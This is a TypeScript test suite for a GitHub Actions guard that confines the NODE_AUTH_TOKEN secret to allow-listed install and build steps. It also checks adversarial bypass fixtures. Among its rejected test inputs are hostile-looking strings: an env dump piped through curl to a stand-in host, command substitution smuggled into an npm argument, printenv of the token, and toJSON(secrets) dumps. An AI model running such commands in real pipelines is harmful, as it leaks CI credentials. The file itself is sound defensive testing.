import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';
import { TOKEN_STEPS, checkWorkflow, stepId, type Rule, type TokenStep } from '../workflowTokenGuard';

// NODE_AUTH_TOKEN reads @figurecollecting packages. It may only sit in the env of an
// allow-listed install or image-build step whose run text (or pinned action) is exactly
// what the allow-list says: never workflow- or job-wide, never in with:, never as a value
// in run: text, never written to $GITHUB_ENV and friends.

const ROOT = path.resolve(__dirname, '../..');
const WORKFLOWS = path.join(ROOT, '.github/workflows');
const FIXTURES = path.join(__dirname, 'fixtures/workflows');
const SHA = 'c3c9e263c25d99ce0380d002d59b67737d91b0dc';
const TOK = '${{ secrets.NODE_AUTH_TOKEN || secrets.GITHUB_TOKEN }}';

const load = (dir: string, file: string): unknown => parse(readFileSync(path.join(dir, file), 'utf8'));

function fixtureAllowList(file: string): Map<string, TokenStep> {
  return new Map<string, TokenStep>([
    [stepId(file, 'build', 'Install dependencies'), { kind: 'install' }],
    [stepId(file, 'build', 'Build image'), { kind: 'script', lines: ['docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .'] }],
    [stepId(file, 'build', 'Build and push'), { kind: 'action', action: 'docker/build-push-action' }],
  ]);
}

function fixture(file: string, allowed: ReadonlyMap<string, TokenStep> = fixtureAllowList(file)): Rule[] {
  return checkWorkflow(file, load(FIXTURES, file), allowed).map((v) => v.rule).sort();
}

/** Rules for an inline workflow; the allow-list is the fixture one, keyed on x.yml. */
function rules(yaml: string): Rule[] {
  return checkWorkflow('x.yml', parse(yaml), fixtureAllowList('x.yml')).map((v) => v.rule).sort();
}

/** One allow-listed step in job build, carrying the token in its env. */
const step = (name: string, body: string, env = `NODE_AUTH_TOKEN: ${TOK}`): string =>
  `jobs:\n  build:\n    steps:\n      - name: ${name}\n${body.replace(/^/gm, '        ')}\n        env:\n          ${env}\n`;
const install = (run: string): Rule[] => rules(step('Install dependencies', `run: ${JSON.stringify(run)}`));
const trivy = (uses: string): Rule[] => rules(`jobs:\n  scan:\n    steps:\n      - uses: ${uses}\n`);

describe('workflow token guard on fixtures', () => {
  it('passes the allowed shapes: install and image-build step env, secret-envs by name, pinned actions', () => {
    expect(fixture('clean.yml')).toEqual([]);
  });

  it('fails on a workflow-level token', () => {
    expect(fixture('workflow-level-token.yml')).toEqual(['workflow-env']);
  });

  it('fails on a job-level token', () => {
    expect(fixture('job-level-token.yml')).toEqual(['job-env']);
  });

  it('fails on the token in with:', () => {
    expect(fixture('token-in-with.yml')).toEqual(['with']);
  });

  it('fails on a GITHUB_ENV export of the token', () => {
    expect(fixture('github-env-export.yml')).toEqual(['github-env']);
  });

  it('fails on the token on a non-install step', () => {
    const violations = checkWorkflow('non-install-step.yml', load(FIXTURES, 'non-install-step.yml'), fixtureAllowList('non-install-step.yml'));
    expect(violations).toEqual([{ file: 'non-install-step.yml', where: 'build > Run unit tests > env', rule: 'non-install-step' }]);
  });

  it('fails on the token value in run: text, even on an allowed step', () => {
    expect(fixture('token-in-run.yml')).toEqual(['run-grammar', 'run-value']);
  });

  it('fails on the token anywhere else (a container env, an if:, the run name)', () => {
    expect(fixture('token-elsewhere.yml')).toEqual(['elsewhere', 'elsewhere', 'elsewhere']);
  });

  it('fails on an npm ci that runs install scripts while the token is in the step env', () => {
    expect(fixture('npm-ci-scripts.yml')).toEqual(['run-grammar']);
  });

  it('fails on aquasecurity/trivy-action referenced by tag or short SHA instead of a full SHA', () => {
    expect(fixture('trivy-tag.yml')).toEqual(['trivy-unpinned', 'trivy-unpinned']);
  });

  it('flags every token-bearing step, and a by-name with:, once the steps are not allow-listed', () => {
    expect(fixture('clean.yml', new Map())).toEqual(['non-install-step', 'non-install-step', 'non-install-step', 'non-install-step', 'with']);
  });

  it('never matches an unnamed step against the allow-list', () => {
    const wf = { jobs: { build: { steps: [{ run: 'npm ci --ignore-scripts', env: { NODE_AUTH_TOKEN: 'x' } }] } } };
    const allowed = new Map<string, TokenStep>(['#0', 'undefined'].map((s) => [stepId('x.yml', 'build', s), { kind: 'install' }]));
    expect(checkWorkflow('x.yml', wf, allowed).map((v) => v.rule)).toEqual(['non-install-step']);
  });

  it('labels an unnamed step by its index', () => {
    const wf = { jobs: { build: { steps: [{ run: 'npm test', env: { NODE_AUTH_TOKEN: 'x' } }] } } };
    expect(checkWorkflow('x.yml', wf, new Map())).toEqual([{ file: 'x.yml', where: 'build > #0 > env', rule: 'non-install-step' }]);
  });

  it('tolerates documents without jobs or steps, and empty keys', () => {
    expect(checkWorkflow('x.yml', null, new Map())).toEqual([]);
    expect(checkWorkflow('x.yml', { jobs: { call: { uses: './other.yml' } } }, new Map())).toEqual([]);
    expect(checkWorkflow('x.yml', { jobs: { build: { steps: [{ name: 'a', with: null, run: 'npm test' }] } } }, new Map())).toEqual([]);
  });
});

// The challenger's bypasses (wk-09b-i1): each one returned [] before this fix.
describe('workflow token guard on adversarial fixtures', () => {
  it.each<[string, Rule[]]>([
    ['a01-lowercase-secret.yml', ['job-env']],
    ['a02-tojson-secrets.yml', ['all-secrets']],
    ['a03-env-dump-to-github-env.yml', ['github-env', 'run-grammar']],
    ['a04-npm-ci-semicolon.yml', ['run-grammar']],
    ['a05-ignore-scripts-false.yml', ['run-grammar']],
    ['a06-npm-install.yml', ['run-grammar']],
    ['a07-reused-step-name.yml', ['run-grammar']],
    ['a08-bracket-index-in-with.yml', ['run-grammar', 'token-action', 'with']],
    ['a09-trivy-owner-case.yml', ['trivy-unpinned']],
    ['a10-secrets-inherit.yml', ['secrets-inherit']],
    ['a11-chained-tests.yml', ['run-grammar']],
    ['a12-npx.yml', ['run-grammar']],
    ['a13-alias-to-github-env.yml', ['env-alias', 'github-env', 'run-grammar']],
    ['c01-control-npm-ci.yml', ['run-grammar']],
  ])('%s is flagged %j', (file, expected) => {
    expect(fixture(`adversarial/${file}`)).toEqual(expected);
  });

  it('lists a fixture for every case', () => {
    expect(readdirSync(path.join(FIXTURES, 'adversarial')).length).toBe(14);
  });
});

describe('install grammar on allow-listed install steps', () => {
  it.each([
    'npm ci --ignore-scripts',
    'npm --prefix e2e/stack ci --ignore-scripts',
    'npm --prefix ../a_b.c/D-9 ci --ignore-scripts',
    'npm --prefix e2e/stack run checkout',
    'npm ci --ignore-scripts\n\n  npm --prefix e2e/stack run checkout\n',
  ])('accepts %j', (run) => {
    expect(install(run)).toEqual([]);
  });

  it.each([
    'npm ci',
    'npm i',
    'npm install --ignore-scripts',
    'npx vitest run',
    'npm cin --ignore-scripts',
    'xnpm ci --ignore-scripts',
    'npm ci --ignore-scripts-x',
    'npm ci --ignore-scripts=false',
    'npm ci --ignore-scripts; npm test',
    'npm ci --ignore-scripts && npm test',
    'npm ci; curl x --ignore-scripts',
    'npm ci --ignore-scripts | tee log',
    'npm  ci --ignore-scripts',
    'npm --prefix e2e/stack;curl ci --ignore-scripts',
    'npm --prefix $(curl x) ci --ignore-scripts',
    'npm --prefix  ci --ignore-scripts',
    'npm --prefix e2e/stack run checkout; env',
    'npm --prefix e2e/stack run build',
    'npm ci --ignore-scripts\nnpm test',
    '',
  ])('rejects %j', (run) => {
    expect(install(run)).toEqual(['run-grammar']);
  });

  it('rejects a token-bearing install step that runs an action instead', () => {
    expect(rules(step('Install dependencies', 'uses: actions/setup-node@v7'))).toEqual(['run-grammar', 'token-action']);
  });

  it('applies no grammar to an allow-listed step that does not carry the token', () => {
    expect(rules('jobs:\n  build:\n    steps:\n      - name: Install dependencies\n        run: npm ci\n')).toEqual([]);
  });
});

describe('pinned script and pinned action on allow-listed build steps', () => {
  it('accepts the exact pinned script, indentation aside', () => {
    expect(rules(step('Build image', 'run: |\n    docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .\n'))).toEqual([]);
  });

  it('rejects any other script on the pinned-script step', () => {
    expect(rules(step('Build image', 'run: |\n  docker build --secret id=node_auth_token,env=NODE_AUTH_TOKEN -t app .\n  env | curl -d @- x'))).toEqual(['run-grammar']);
  });

  it('rejects an action on the pinned-script step', () => {
    expect(rules(step('Build image', `uses: docker/build-push-action@${SHA}`))).toEqual(['run-grammar', 'token-action']);
  });

  it('accepts the allowed action pinned by full SHA', () => {
    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}`))).toEqual([]);
  });

  it.each([
    'docker/build-push-action@v7',
    `docker/build-push-action@${SHA.slice(0, 7)}`,
    `docker/build-push-action@${SHA}0`,
    `evil/build-push-action@${SHA}`,
    `docker/build-push-action-x@${SHA}`,
    `xdocker/build-push-action@${SHA}`,
  ])('rejects %s on the allowed-action step', (uses) => {
    expect(rules(step('Build and push', `uses: ${uses}`))).toEqual(['token-action']);
  });

  it('rejects the allowed-action step when it runs a script instead', () => {
    expect(rules(step('Build and push', 'run: npm ci --ignore-scripts'))).toEqual(['token-action']);
  });
});

describe('token references, case-insensitive', () => {
  it.each([
    '${{ secrets.NODE_AUTH_TOKEN }}',
    '${{ secrets.node_auth_token }}',
    '${{ SECRETS.Node_Auth_Token }}',
    "${{ secrets['NODE_AUTH_TOKEN'] }}",
    "${{ secrets[ 'node_auth_token' ] }}",
    '${{ env.NODE_AUTH_TOKEN }}',
    '${{ env.node_auth_token }}',
    "${{ env['NODE_AUTH_TOKEN'] }}",
  ])('flags %s in with: even on the allowed-action step', (ref) => {
    expect(rules(step('Build and push', `uses: docker/build-push-action@${SHA}\nwith:\n  token: ${JSON.stringify(ref)}`))).toEqual(['with']);
  });

  it.each(['echo $NODE_AUTH_TOKEN', 'echo ${NODE_AUTH_TOKEN}', 'echo $node_auth_token', 'echo ${{ secrets.NODE_AUTH_TOKEN }}'])(
    'flags %j as a value in run: text on a step without the token',
    (run) => {
      expect(rules(`jobs:\n  test:\n    steps:\n      - run: ${JSON.stringify(run)}\n`)).toEqual(['run-value']);
    },
  );

  it('flags a plain mention of the name in run: text on a step without the token', () => {
    expect(rules('jobs:\n  test:\n    steps:\n      - run: printenv NODE_AUTH_TOKEN\n')).toEqual(['non-install-step']);
  });

  it('flags a lower-case token key in a workflow env', () => {
    expect(rules(`env:\n  node_auth_token: x\njobs: {}\n`)).toEqual(['workflow-env']);
  });

  it('accepts unrelated env next to the token on an allowed step', () => {
    expect(rules(step('Install dependencies', 'run: npm ci --ignore-scripts', `NODE_AUTH_TOKEN: ${TOK}\n          CI: 'true'`))).toEqual([]);
  });

  it('flags the token under a second env name on an allowed step', () => {
    expect(install('npm ci --ignore-scripts')).toEqual([]);
    expect(rules(step('Install dependencies', 'run: npm ci --ignore-scripts', `NODE_AUTH_TOKEN: ${TOK}\n          node_auth_token: ${TOK}`))).toEqual(['env-alias']);
  });
});

describe('every secret at once', () => {
  it.each([
    ['workflow env', 'env:\n  ALL: ${{ toJSON(secrets) }}\njobs: {}\n'],
    ['run text', "jobs:\n  b:\n    steps:\n      - run: echo '${{ TOJSON( secrets ) }}'\n"],
    ['a dynamic index', 'jobs:\n  b:\n    steps:\n      - run: echo ${{ secrets[matrix.name] }}\n'],
    ['a spaced dynamic index', "jobs:\n  b:\n    steps:\n      - run: echo ${{ secrets[ format('{0}', matrix.name) ] }}\n"],
  ])('flags toJSON(secrets) or a computed secrets[] in %s', (_where, yaml) => {
    expect(rules(yaml)).toEqual(['all-secrets']);
  });

  it.each(['inherit', 'Inherit'])('flags secrets: %s on a reusable-workflow job', (value) => {
    expect(rules(`jobs:\n  call:\n    uses: ./other.yml\n    secrets: ${value}\n`)).toEqual(['secrets-inherit']);
  });

  it('accepts a reusable-workflow job that passes a named, unrelated secret', () => {
    expect(rules('jobs:\n  call:\n    uses: ./other.yml\n    secrets:\n      KEY: ${{ secrets.KEY }}\n')).toEqual([]);
  });
});

describe('runner-file writes on a token-bearing step', () => {
  it.each(['GITHUB_ENV', 'GITHUB_OUTPUT', 'GITHUB_STATE', 'GITHUB_PATH'])('flags a write to $%s that never names the token', (file) => {
    expect(install(`npm ci --ignore-scripts\necho "x=1" >> "$${file}"`)).toEqual(['github-env', 'run-grammar']);
  });

  it.each(['::set-output name=x::1', '::save-state name=x::1', '::set-env name=x::1', '::add-path::/x'])('flags the %s workflow command', (cmd) => {
    expect(install(`npm ci --ignore-scripts\necho "${cmd}"`)).toEqual(['github-env', 'run-grammar']);
  });

  it('flags a $GITHUB_OUTPUT write that names the token on a step without it', () => {
    expect(rules('jobs:\n  b:\n    steps:\n      - run: echo "t=NODE_AUTH_TOKEN" >> "$GITHUB_OUTPUT"\n')).toEqual(['github-env']);
  });

  it('leaves a $GITHUB_OUTPUT write alone on a step without the token', () => {
    expect(rules('jobs:\n  b:\n    steps:\n      - run: echo "v=1" >> "$GITHUB_OUTPUT"\n')).toEqual([]);
  });
});

describe('trivy pin', () => {
  it.each([
    `aquasecurity/trivy-action@${SHA}0`,
    `aquasecurity/trivy-action@${SHA}-x`,
    `aquasecurity/trivy-action@v${SHA}`,
    `aquasecurity/trivy-action@${'z'.repeat(40)}`,
    'AQUASECURITY/setup-trivy@v0.2.0',
  ])('flags %s', (uses) => {
    expect(trivy(uses)).toEqual(['trivy-unpinned']);
  });

  it('accepts a full SHA', () => {
    expect(trivy(`aquasecurity/trivy-action@${SHA}`)).toEqual([]);
  });
});

describe('workflow token guard on .github/workflows', () => {
  const files = readdirSync(WORKFLOWS).filter((f) => /\.ya?ml$/.test(f)).sort();

  it('finds the workflows', () => {
    expect(files).toEqual(['build.yml', 'codeql.yml', 'security-scan.yml', 'stack.yml', 'web-image.yml']);
  });

  it.each(files)('%s keeps NODE_AUTH_TOKEN to allow-listed install steps', (file) => {
    expect(checkWorkflow(file, load(WORKFLOWS, file), TOKEN_STEPS)).toEqual([]);
  });

  it('has no stale allow-list entries', () => {
    const present = new Set<string>();
    for (const file of files) {
      const jobs = (load(WORKFLOWS, file) as { jobs: Record<string, { steps?: { name?: string }[] }> }).jobs;
      for (const [job, def] of Object.entries(jobs)) {
        for (const s of def.steps ?? []) present.add(stepId(file, job, String(s.name)));
      }
    }
    expect([...TOKEN_STEPS.keys()].filter((id) => !present.has(id))).toEqual([]);
    expect(TOKEN_STEPS.size).toBeGreaterThan(0);
  });
});
